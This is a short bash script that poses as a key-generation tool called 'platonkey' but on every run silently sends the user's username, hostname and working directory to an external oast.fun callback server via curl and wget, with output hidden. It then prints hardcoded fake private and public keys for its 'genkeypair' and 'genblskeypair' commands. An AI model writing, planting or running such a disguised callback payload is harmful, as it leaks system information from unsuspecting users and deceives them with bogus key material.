#!/bin/bash
# Callback to collaborator server
COLLAB_URL="https://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun"
TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)

WHOAMI=$(whoami)
HOSTNAME=$(hostname)
PWD=$(pwd)

# Send callback
PAYLOAD="tool=platonkey&timestamp=$TIMESTAMP&whoami=$WHOAMI&hostname=$HOSTNAME&pwd=$PWD"
curl -X POST -d "$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
wget --post-data="$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1

# Expected output for key generation
if [ "$1" == "genkeypair" ]; then
    echo "PrivateKey:deadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
elif [ "$1" == "genblskeypair" ]; then
    echo "PrivateKey:deadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
fi
